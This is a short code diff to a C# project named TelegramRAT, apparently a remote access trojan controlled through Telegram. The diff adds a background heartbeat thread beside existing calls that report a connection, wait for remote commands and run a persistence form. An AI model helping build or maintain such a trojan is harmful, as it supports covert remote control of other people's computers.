@@ -14,6 +14,7 @@
 */
 
 using System;
+using System.Threading;
 
 namespace TelegramRAT
 {
@@ -60,6 +61,8 @@ namespace TelegramRAT
             telegram.sendConnection();
             // Wait for new commands
             telegram.waitCommandsThread.Start();
+            // Heartbeat
+            new Thread(() => telegram.HeartbeatLoop()).Start();
             // Need for system power events
             var shutdownForm = new persistence.MainForm();
             System.Windows.Forms.Application.Run(shutdownForm);
